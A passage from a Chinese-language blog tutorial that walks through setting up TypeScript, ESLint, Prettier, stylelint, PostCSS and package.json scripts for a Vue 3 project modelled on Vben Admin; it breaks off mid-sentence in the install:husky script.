\u0026#34;lib\u0026#34;: [\u0026#34;dom\u0026#34;, \u0026#34;esnext\u0026#34;], // ↓ 要包含的類型聲明文件名列表。 \u0026#34;types\u0026#34;: [\u0026#34;vite/client\u0026#34;], // ↓ 要包含的類型聲明文件路徑列表。 \u0026#34;typeRoots\u0026#34;: [\u0026#34;./node_modules/@types/\u0026#34;, \u0026#34;./types\u0026#34;], \u0026#34;incremental\u0026#34;: true, // ↓ 在表達式和聲明上有隱含的 any類型時報錯。 \u0026#34;noImplicitAny\u0026#34;: false, // ↓ 忽略所有的聲明文件（ *.d.ts）的類型檢查。 \u0026#34;skipLibCheck\u0026#34;: true, // ↓ 模塊名到基於 baseUrl的路徑映射的列表。查看 模塊解析文檔了解詳情。 \u0026#34;paths\u0026#34;: { \u0026#34;/@/*\u0026#34;: [\u0026#34;src/*\u0026#34;], \u0026#34;/#/*\u0026#34;: [\u0026#34;types/*\u0026#34;] } }, // ↓ 指定一個匹配列表（屬於自動指定該路徑下的所有ts相關文件） \u0026#34;include\u0026#34;: [ \u0026#34;src/**/*.ts\u0026#34;, \u0026#34;src/**/*.d.ts\u0026#34;, \u0026#34;src/**/*.tsx\u0026#34;, \u0026#34;src/**/*.vue\u0026#34;, \u0026#34;types/**/*.d.ts\u0026#34;, \u0026#34;types/**/*.ts\u0026#34;, \u0026#34;mock/**/*.ts\u0026#34; ], // ↓ 指定一個排除列表（include的反向操作） \u0026#34;exclude\u0026#34;: [\u0026#34;node_modules\u0026#34;, \u0026#34;dist\u0026#34;, \u0026#34;**/*.js\u0026#34;] } 這裡配置完ESLint之後會報錯，說找不到vite/client。不用管它，當你執行完後面的ESLint-TS的時候就不會報錯了。\n安裝 ESLint 說明 ESLint簡單的來說就是去判斷你的JS代碼寫的格式對不對的一個依賴。沒有它你的代碼也能運行，有了它你的代碼可以寫的更漂亮。 ESLint還支持插件，第三方框架會基於ESLint寫出自己的代碼檢查插件。比如Vue3對應eslint-plugin-vue。\nESLint官網 ESLint-快速入門 配置ESLint ESLint的配置規則 安裝 ESLint 1 yarn add eslint --dev 配置ESLint：根目錄下創建：.eslintrc.js文件。 這裡可以使用eslint的init。但是我不清楚Vben的初始化操作是怎麼選的，所以直接拷貝Vben的配置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 module.exports = { // ↓ 默認情況下，ESLint 會在所有父級目錄裡尋找配置文件，一直到根目錄。如果你想要你所有項目都遵循一個特定的約定時，這將會很有用，但有時候會導致意想不到的結果。為了將 ESLint 限製到一個特定的項目，在你項目根目錄下的 package.json 文件或者 .eslintrc.* 文件裡的 eslintConfig 字段下設置 \u0026#34;root\u0026#34;: true。 ESLint 一旦發現配置文件中有 \u0026#34;root\u0026#34;: true，它就會停止在父級目錄中尋找。 // ↓ 此項是用來告訴eslint找當前配置文件不能往父級查找 root: true, // ↓ 指定你想啟用的環境 env: { browser: true, node: true, es6: true, }, // ↓ 設置解析器 parser: \u0026#34;\u0026#34;, // ↓ 解析器選項 parserOptions: {}, // ↓ 擴展項 extends: [], // ↓ 自定義規則配置 rules: {} } 配置ESLint忽略文件：根目錄下創建：.eslintignore文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *.sh node_modules *.md *.woff *.ttf .vscode .idea dist /public /docs .husky .local /bin Dockerfile 安裝 eslint-plugin-vue 說明 ESLint是檢查JS代碼的依賴，那麼它怎麼去檢查Vue語法的文件呢？要完成這件事，我們就需要安裝vue官方開發的ESLint插件eslint-plugin-vue。這樣ESLint就知道該怎麼檢查vue的文件了。\neslint-plugin-vue的官方文檔 eslint-plugin-vue的npm首頁 vue eslint 升級_ESLint 的 parser 是個什麼東西 vue-eslint-parser的Git地址 怎麼理解eslint-plugin-vue和vue-eslint-parser的關係呢?\nESLint 會對我們的代碼進行校驗，而 parser 的作用是將我們寫的代碼轉換為 ESTree，ESLint 會對 ESTree 進行校驗。\nvue-eslint-parser文檔上說是vue的模板解析器。 vue-eslint-parser的文檔中強調\u0026lt;template\u0026gt;標籤中的內容進行檢查。\n那麼我的理解是vue-eslint-parser將vue文件轉換成ESTree。然後使用eslint-plugin-vue來檢查這個ESTree。查出的結果交給ESLint。\nvue-eslint-parser的官方說明：\nThis parser allows us to lint the \u0026lt;template\u0026gt; of .vue files. We can make mistakes easily on \u0026lt;template\u0026gt; if we use complex directives and expressions in the template. This parser and the rules of eslint-plugin-vue would catch some of the mistakes.\n這個解析器允許我們對.vue文件的\u0026lt;template\u0026gt;進行檢查。如果我們在模板中使用了複雜的指令和表達式，我們很容易在\u0026lt;template\u0026gt;上出錯。這個解析器和eslint-plugin-vue的規則可以發現一些錯誤。\n總之eslint-plugin-vue和vue-eslint-parser需要一起使用，而且官網也有標示怎麼操作。\n安裝兩個 npm 插件 1 yarn add eslint-plugin-vue vue-eslint-parser --dev 將插件配置進ESLint 配置ESLint：根目錄下修改：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 module.exports = { // ... parser: \u0026#39;vue-eslint-parser\u0026#39;, // ... extends: [ \u0026#39;plugin:vue/vue3-recommended\u0026#39;, ], // ... } 安裝 @typescript-eslint 說明 這裡同理需要安裝 @typescript-eslint/eslint-plugin 和 @typescript-eslint/parser。\nTS-ESLint規則 @typescript-eslint/eslint-plugin的npm首頁 @typescript-eslint/parser的npm首頁 安裝TS的Lint 1 yarn add @typescript-eslint/eslint-plugin @typescript-eslint/parser --dev 將插件配置進ESLint 配置ESLint：根目錄下修改：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 module.exports = { // ... parserOptions: { parser: \u0026#34;@typescript-eslint/parser\u0026#34;, ecmaVersion: 2020, sourceType: \u0026#34;module\u0026#34;, jsxPragma: \u0026#34;React\u0026#34;, ecmaFeatures: { jsx: true, tsx: true, }, }, extends: [\u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;], // ... } 安裝 eslint-plugin-prettier 說明 prettier用來格式化代碼的。一般IDE都有prettier的插件，在保存的時候格式化代碼。那麼我們eslint-plugin-prettier就是通過JS來判斷代碼格式是否正確。 一般這很必要，因為不同的程序員有不同的IDE，不同的IDE有不同的prettier插件。但對於項目來說只有一個eslint-plugin-prettier。\n而eslint-plugin-prettier插件依賴於prettier依賴。那麼eslint-config-prettier插件又是幹嘛的？\nprettier和ESLint之間有些規則不一樣，因此是用於解決衝突得。eslint-config-prettier將prettier一些規則默認關閉了。\n使用ESLint+Prettier來統一前端代碼風格 prettier首頁 prettier的npm首頁 eslint-plugin-prettier的npm首頁 eslint-config-prettier的npm首頁 安裝 1 yarn add prettier eslint-plugin-prettier eslint-config-prettier --dev 配置prettier prettier的配置項\n根目錄下創建：prettier.config.js文件 prettier.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { printWidth: 100, tabWidth: 2, useTabs: false, semi: true, vueIndentScriptAndStyle: true, singleQuote: true, quoteProps: \u0026#39;as-needed\u0026#39;, bracketSpacing: true, trailingComma: \u0026#39;es5\u0026#39;, jsxBracketSameLine: false, jsxSingleQuote: false, arrowParens: \u0026#39;always\u0026#39;, insertPragma: false, requirePragma: false, proseWrap: \u0026#39;never\u0026#39;, htmlWhitespaceSensitivity: \u0026#39;strict\u0026#39;, endOfLine: \u0026#39;lf\u0026#39;, rangeStart: 0 } 配置prettier忽略文件 根目錄下創建：.prettierignore文件 .prettierignore 1 2 3 4 5 6 7 8 9 /dist/* .local .output.js /node_modules/** **/*.svg **/*.sh /public/* 配置進ESLint 配置ESLint：修改根目錄下：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 module.exports = { // ... extends: [ \u0026#34;plugin:vue/vue3-recommended\u0026#34;, \u0026#34;plugin:@typescript-eslint/recommended\u0026#34;, \u0026#34;prettier\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34;, ], // ... } 自定義ESLint檢查規則 說明 ESLint是用來檢查代碼的。又安裝了那麼多的插件。但是官方默認的方案有時不一樣符合我們的要求。我們需要自定義自己的規則。\n修改規則主要是修改根目錄下.eslintrc.js文件的rules字段。\n修改規則 @typescript-eslint/ban-ts-ignore @typescript-eslint/explicit-function-return-type @typescript-eslint/no-explicit-any @typescript-eslint/no-var-requires @typescript-eslint/no-empty-function vue/custom-event-name-casing no-use-before-define @typescript-eslint/no-use-before-define @typescript-eslint/ban-ts-comment @typescript-eslint/ban-types @typescript-eslint/no-non-null-assertion @typescript-eslint/explicit-module-boundary-types @typescript-eslint/no-unused-vars no-unused-vars space-before-function-paren vue/attributes-order vue/one-component-per-file vue/html-closing-bracket-newline vue/max-attributes-per-line vue/multiline-html-element-content-newline singleline-html-element-content-newline vue/attribute-hyphenation vue/html-self-closing vue/require-default-prop 配置ESLint：根目錄下：.eslintrc.js文件 .eslintrc.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 module.exports = { // ... rules: { // ↓ 禁止使用@ts-ignore來消除ESLint檢查 \u0026#39;@typescript-eslint/ban-ts-ignore\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在函數和類方法上需要顯式的返回類型 \u0026#39;@typescript-eslint/explicit-function-return-type\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用any類型 \u0026#39;@typescript-eslint/no-explicit-any\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 除導入語句外，禁止使用require語句 \u0026#39;@typescript-eslint/no-var-requires\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用空函數 \u0026#39;@typescript-eslint/no-empty-function\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 對自定義事件名稱強制使用特定的大小寫 \u0026#39;vue/custom-event-name-casing\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止定義前使用 \u0026#39;no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在定義變量之前不允許使用變量 \u0026#39;@typescript-eslint/no-use-before-define\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用@ts-註解 \u0026#39;@typescript-eslint/ban-ts-comment\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用特定類型 \u0026#39;@typescript-eslint/ban-types\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用!後綴運算符進行非null斷言 \u0026#39;@typescript-eslint/no-non-null-assertion\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在導出的函數和類的公共類方法上需要顯式的返回值和參數類型 \u0026#39;@typescript-eslint/explicit-module-boundary-types\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 禁止使用未使用的變量 \u0026#39;@typescript-eslint/no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // ↓ 禁止使用未使用的變量 \u0026#39;no-unused-vars\u0026#39;: [ \u0026#39;error\u0026#39;, { argsIgnorePattern: \u0026#39;^h$\u0026#39;, varsIgnorePattern: \u0026#39;^h$\u0026#39;, }, ], // ↓ 在函數括號前需要或不允許有空格 \u0026#39;space-before-function-paren\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制屬性順序 \u0026#39;vue/attributes-order\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制每個組件應位於其自己的文件中 \u0026#39;vue/one-component-per-file\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在標籤的右括號之前要求或不允許換行 \u0026#39;vue/html-closing-bracket-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 強制每行的最大屬性數 \u0026#39;vue/max-attributes-per-line\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在多行元素的內容之前和之後需要換行 \u0026#39;vue/multiline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在單行元素的內容之前和之後需要換行 \u0026#39;vue/singleline-html-element-content-newline\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 在模板中的自定義組件上實施屬性命名樣式 \u0026#39;vue/attribute-hyphenation\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 需要道具的默認值 \u0026#39;vue/require-default-prop\u0026#39;: \u0026#39;off\u0026#39;, // ↓ 實施自我封閉的風格 // \u0026#39;vue/html-self-closing\u0026#39;: \u0026#39;off\u0026#39;, \u0026#39;vue/html-self-closing\u0026#39;: [ \u0026#39;error\u0026#39;, { html: { void: \u0026#39;always\u0026#39;, normal: \u0026#39;never\u0026#39;, component: \u0026#39;always\u0026#39;, }, svg: \u0026#39;always\u0026#39;, math: \u0026#39;always\u0026#39; } ] } } vben項目配置git忽略文件 說明 這個應該是項目一上來就要處理的，但是我手撕Vben的時候，按照配置文件的順序下來，到現在才處理了。\n創建Git忽略文件 根目錄下創建：.gitignore文件 .gitignore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 node_modules .DS_Store dist dist-ssr *.local # other .npmrc .cache test/upload-server/static .local # local env files .env.local .env.*.local # Log files npm-debug.log* yarn-debug.log* yarn-error.log* pnpm-debug.log* # Editor directories and files .idea # .vscode *.suo *.ntvs* *.njsproj *.sln *.sw? 安裝style-lint 說明 這次需要安裝四個插件stylelint、stylelint-config-standard、stylelint-config-prettier、stylelint-order。\nstylelint是對我們編寫的樣式進行檢查的插件。 stylelint-config-standard是stylelint擴展的檢查標準庫。 stylelint-config-prettier是用來解決衝突的（估計又和ESLint衝突了，參考之前的prettier）。 stylelint-order是檢查我們樣式編寫順序的。 參考連結 stylelint官網 stylelint的npm首頁 stylelint-config-standard的npm首頁：擴展，標準庫 stylelint-config-prettier的npm首頁：擴展，解決衝突的 stylelint-order的npm首頁：插件，樣式排序 stylelinit的配置說明 stylelint的配置規則 安裝 1 yarn add stylelint stylelint-config-standard stylelint-config-prettier stylelint-order --dev 配置stylelint 根目錄下創建：stylelint.config.js文件 stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 module.exports = { // ↓ 這個好像是沒有用的，但是VbenAdmin是這麼寫的 root: true, // ↓ 插件 plugins: [\u0026#39;stylelint-order\u0026#39;], // ↓ 擴展 extends: [\u0026#39;stylelint-config-standard\u0026#39;, \u0026#39;stylelint-config-prettier\u0026#39;], // ↓ 自定義規則 rules: {}, // ↓ 忽略檢查的文件 ignoreFiles: [\u0026#39;**/*.js\u0026#39;, \u0026#39;**/*.jsx\u0026#39;, \u0026#39;**/*.tsx\u0026#39;, \u0026#39;**/*.ts\u0026#39;] } 配置自定義樣式規則 根目錄下修改：stylelint.config.js文件 stylelint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 module.exports = { // ... rules: { // ↓ 禁止使用未知的偽類選擇器。 \u0026#39;selector-pseudo-class-no-unknown\u0026#39;: [ true, { ignorePseudoClasses: [\u0026#39;global\u0026#39;] } ], // ↓ 禁止使用未知規則。 \u0026#39;at-rule-no-unknown\u0026#39;: [ true, { ignoreAtRules: [\u0026#39;function\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;each\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;mixin\u0026#39;] } ], // ↓ 禁止空來源。 \u0026#39;no-empty-source\u0026#39;: null, // ↓ 禁止使用無效的命名網格區域。 \u0026#39;named-grid-areas-no-invalid\u0026#39;: null, // ↓ 要求或不允許使用Unicode字節順序標記。 \u0026#39;unicode-bom\u0026#39;: \u0026#39;never\u0026#39;, // ↓ 禁止較低特異性的選擇器在覆蓋較高特異性的選擇器之後出現。 \u0026#39;no-descending-specificity\u0026#39;: null, // ↓ 禁止在字體系列名稱列表中缺少通用系列。 \u0026#39;font-family-no-missing-generic-family-keyword\u0026#39;: null, // ↓ 在聲明的冒號後面需要一個空格或禁止空格。 \u0026#39;declaration-colon-space-after\u0026#39;: \u0026#39;always-single-line\u0026#39;, // ↓ 在聲明的冒號之前需要一個空格或禁止使用空格。 \u0026#39;declaration-colon-space-before\u0026#39;: \u0026#39;never\u0026#39;, // ↓ 在聲明塊內要求或不允許尾隨分號。 \u0026#39;declaration-block-trailing-semicolon\u0026#39;: \u0026#39;always\u0026#39;, // ↓ 在規則之前要求或禁止使用空行。 \u0026#39;rule-empty-line-before\u0026#39;: [ \u0026#39;always\u0026#39;, { ignore: [\u0026#39;after-comment\u0026#39;, \u0026#39;first-nested\u0026#39;], } ], // ↓ 禁止使用未知單位。 \u0026#39;unit-no-unknown\u0026#39;: [true, { ignoreUnits: [\u0026#39;rpx\u0026#39;] }], // Specify the alphabetical order of the attributes in the declaration block // ↓ 樣式順序 \u0026#39;order/properties-order\u0026#39;: [ \u0026#39;position\u0026#39;, \u0026#39;top\u0026#39;, \u0026#39;right\u0026#39;, \u0026#39;bottom\u0026#39;, \u0026#39;left\u0026#39;, \u0026#39;z-index\u0026#39;, \u0026#39;display\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;max-width\u0026#39;, \u0026#39;max-height\u0026#39;, \u0026#39;min-width\u0026#39;, \u0026#39;min-height\u0026#39;, \u0026#39;padding\u0026#39;, \u0026#39;padding-top\u0026#39;, \u0026#39;padding-right\u0026#39;, \u0026#39;padding-bottom\u0026#39;, \u0026#39;padding-left\u0026#39;, \u0026#39;margin\u0026#39;, \u0026#39;margin-top\u0026#39;, \u0026#39;margin-right\u0026#39;, \u0026#39;margin-bottom\u0026#39;, \u0026#39;margin-left\u0026#39;, \u0026#39;margin-collapse\u0026#39;, \u0026#39;margin-top-collapse\u0026#39;, \u0026#39;margin-right-collapse\u0026#39;, \u0026#39;margin-bottom-collapse\u0026#39;, \u0026#39;margin-left-collapse\u0026#39;, \u0026#39;overflow\u0026#39;, \u0026#39;overflow-x\u0026#39;, \u0026#39;overflow-y\u0026#39;, \u0026#39;clip\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;font\u0026#39;, \u0026#39;font-family\u0026#39;, \u0026#39;font-size\u0026#39;, \u0026#39;font-smoothing\u0026#39;, \u0026#39;osx-font-smoothing\u0026#39;, \u0026#39;font-style\u0026#39;, \u0026#39;font-weight\u0026#39;, \u0026#39;hyphens\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;line-height\u0026#39;, \u0026#39;letter-spacing\u0026#39;, \u0026#39;word-spacing\u0026#39;, \u0026#39;color\u0026#39;, \u0026#39;text-align\u0026#39;, \u0026#39;text-decoration\u0026#39;, \u0026#39;text-indent\u0026#39;, \u0026#39;text-overflow\u0026#39;, \u0026#39;text-rendering\u0026#39;, \u0026#39;text-size-adjust\u0026#39;, \u0026#39;text-shadow\u0026#39;, \u0026#39;text-transform\u0026#39;, \u0026#39;word-break\u0026#39;, \u0026#39;word-wrap\u0026#39;, \u0026#39;white-space\u0026#39;, \u0026#39;vertical-align\u0026#39;, \u0026#39;list-style\u0026#39;, \u0026#39;list-style-type\u0026#39;, \u0026#39;list-style-position\u0026#39;, \u0026#39;list-style-image\u0026#39;, \u0026#39;pointer-events\u0026#39;, \u0026#39;cursor\u0026#39;, \u0026#39;background\u0026#39;, \u0026#39;background-attachment\u0026#39;, \u0026#39;background-color\u0026#39;, \u0026#39;background-image\u0026#39;, \u0026#39;background-position\u0026#39;, \u0026#39;background-repeat\u0026#39;, \u0026#39;background-size\u0026#39;, \u0026#39;border\u0026#39;, \u0026#39;border-collapse\u0026#39;, \u0026#39;border-top\u0026#39;, \u0026#39;border-right\u0026#39;, \u0026#39;border-bottom\u0026#39;, \u0026#39;border-left\u0026#39;, \u0026#39;border-color\u0026#39;, \u0026#39;border-image\u0026#39;, \u0026#39;border-top-color\u0026#39;, \u0026#39;border-right-color\u0026#39;, \u0026#39;border-bottom-color\u0026#39;, \u0026#39;border-left-color\u0026#39;, \u0026#39;border-spacing\u0026#39;, \u0026#39;border-style\u0026#39;, \u0026#39;border-top-style\u0026#39;, \u0026#39;border-right-style\u0026#39;, \u0026#39;border-bottom-style\u0026#39;, \u0026#39;border-left-style\u0026#39;, \u0026#39;border-width\u0026#39;, \u0026#39;border-top-width\u0026#39;, \u0026#39;border-right-width\u0026#39;, \u0026#39;border-bottom-width\u0026#39;, \u0026#39;border-left-width\u0026#39;, \u0026#39;border-radius\u0026#39;, \u0026#39;border-top-right-radius\u0026#39;, \u0026#39;border-bottom-right-radius\u0026#39;, \u0026#39;border-bottom-left-radius\u0026#39;, \u0026#39;border-top-left-radius\u0026#39;, \u0026#39;border-radius-topright\u0026#39;, \u0026#39;border-radius-bottomright\u0026#39;, \u0026#39;border-radius-bottomleft\u0026#39;, \u0026#39;border-radius-topleft\u0026#39;, \u0026#39;content\u0026#39;, \u0026#39;quotes\u0026#39;, \u0026#39;outline\u0026#39;, \u0026#39;outline-offset\u0026#39;, \u0026#39;opacity\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;visibility\u0026#39;, \u0026#39;size\u0026#39;, \u0026#39;zoom\u0026#39;, \u0026#39;transform\u0026#39;, \u0026#39;box-align\u0026#39;, \u0026#39;box-flex\u0026#39;, \u0026#39;box-orient\u0026#39;, \u0026#39;box-pack\u0026#39;, \u0026#39;box-shadow\u0026#39;, \u0026#39;box-sizing\u0026#39;, \u0026#39;table-layout\u0026#39;, \u0026#39;animation\u0026#39;, \u0026#39;animation-delay\u0026#39;, \u0026#39;animation-duration\u0026#39;, \u0026#39;animation-iteration-count\u0026#39;, \u0026#39;animation-name\u0026#39;, \u0026#39;animation-play-state\u0026#39;, \u0026#39;animation-timing-function\u0026#39;, \u0026#39;animation-fill-mode\u0026#39;, \u0026#39;transition\u0026#39;, \u0026#39;transition-delay\u0026#39;, \u0026#39;transition-duration\u0026#39;, \u0026#39;transition-property\u0026#39;, \u0026#39;transition-timing-function\u0026#39;, \u0026#39;background-clip\u0026#39;, \u0026#39;backface-visibility\u0026#39;, \u0026#39;resize\u0026#39;, \u0026#39;appearance\u0026#39;, \u0026#39;user-select\u0026#39;, \u0026#39;interpolation-mode\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;marks\u0026#39;, \u0026#39;page\u0026#39;, \u0026#39;set-link-source\u0026#39;, \u0026#39;unicode-bidi\u0026#39;, \u0026#39;speak\u0026#39; ] } // ... } 配置stylelint忽略文件 根目錄下創建：.stylelintignore文件 .stylelintignore 1 2 /dist/* /public/* 配置Yarn自動清除功能 說明 實現每一次install之後、add之後、yarn autoclean --force之後。從程序包依賴項中清除並刪除不必要的文件。\n參考鏈接：yarn autoclean-官方說明\n初始化 1 yarn autoclean --init 執行完命令之後，Yarn就會自動在根目錄下創建一個.yarnclean文件，這樣就可以了。\n安裝PostCSS 說明 我們需要安裝兩個庫postcss、autoprefixer。要現實的效果就是我們編寫一般的樣式，渲染頁面的dom節點有面向各種瀏覽器廠商的樣式。\n網上說postcss類似一個平台，上面有很多插件，autoprefixer就其中一個。\n我以我的看法來解釋一下：postcss就像一個管子，autoprefixer是裡面的過濾器。你寫的css從管子中流過，經過他們的處理就出現了不同的結果。\n參考連結：\nVite配置PostCss postcss的官網 postcss的npm首頁 autoprefixer的npm首頁 知乎autoprefixer說明 安裝 1 yarn add postcss autoprefixer --dev 配置postcss 根目錄下：postcss.config.js postcss.config.js 1 2 3 4 5 module.exports = { plugins: { autoprefixer: {} } } 解析VbenAdmin中的script 說明 VbenAdmin官方文檔-npm Script\n一下腳本直接添加在根目錄下的package.json的scripts對象中即可。也可以直接照搬VbenAdmin的。\n以bootstrap為例。如下：\n1 2 3 yarn bootstrap # or # npm run bootstrap bootstrap 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, // ... } 作用：使用yarn安裝所有依賴。\nserve 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } 作用：以開發環境運行項目，並設置node的運行內存為4G。\n--max-old-space-size：單位為MB --max-new-space-size：單位為KB node命令行文檔 npx的Git首頁，有命令行說明 \u0026ndash;max-old-space-size参数说明 dev 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } 作用：同serve。\nbuild 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, // ... } 作用：這裡先不管。先使用原來創建項目的\u0026quot;build\u0026quot;: \u0026quot;vite build\u0026quot;。後面完成了vite配置之後再處理這個腳本。\nbuild:no-cache 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, // ... } 作用：清空緩存後構建。\nreport 作用：生成打包分析，這裡先不管，等後面配置vite再說。\npreview 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, // ... } 作用：先打包在進行預覽，使用vite訪問dist目錄。\npreview:dist 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, // ... } 作用：直接預覽本地 dist 文件目錄。\nlog 詳情查閱：使用conventional-changelog-cli生成變更記錄\n作用：用來生產Git提交記錄的。\nclean:cache 作用：刪除緩存，刪除node_modules/.cache/和node_modules/.vite下的文件，由於刪除命令依賴還沒安裝，所以後面再講。\nclean:lib 作用：清除依賴，刪除node_modules文件夾，由於刪除命令依賴還沒安裝，所以後面再講。\nlint:eslint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, // ... } 作用：執行 eslint 校驗，該命令會對項目的src、mock目錄下的vue、ts、tsx文件進行 eslint 校驗，並修復部分問題。\n參考連結：eslint命令行說明\nlint:prettier 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, // ... } 作用：執行 prettier 格式化代碼。該命令會對項目所有代碼 進行 prettier 格式化。謹慎執行。\n如果你的vsCode安裝了prettier插件。那麼prettier插件就會讀取根目錄下的prettier.config.js文件。當你保存的時候就會進行格式化文件。\n但是過是別人提交上來的文件，你還去點開它的文件一個一個保存麼？所以執行這個命令，可以將src目錄下，所有的文件格式化。\n參考連結：prettier命令行說明\nlint:stylelint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, // ... } 作用：校驗所有文件的樣式格式，並嘗試修復。\n參考連結：stylelint命令行说明\nlint:ls-lint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, // ... } 作用：校驗所有文件命名是否正確。\nlint:lint-staged 需先創建lint-staged的配置文件\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, // ... } 作用：對Git暫存的文件進行lint檢查。\nlint:pretty 需先創建lint-staged的配置文件\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, // ... } 作用：對Git暫存文件進行pretty的操作。\ntest:gzip 作用：這個後面再說，http-server的npm首頁。\ntest:br 作用：這個後面再說，http-server的npm首頁。\nreinstall 作用：重新安裝依賴，該命令會先刪除 node_modules、yarn.lock、package.lock.json後在進行依賴重新安裝，速度會明顯變慢。\n由於刪除命令依賴還沒安裝，所以後面再講。\ninstall:husky 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci 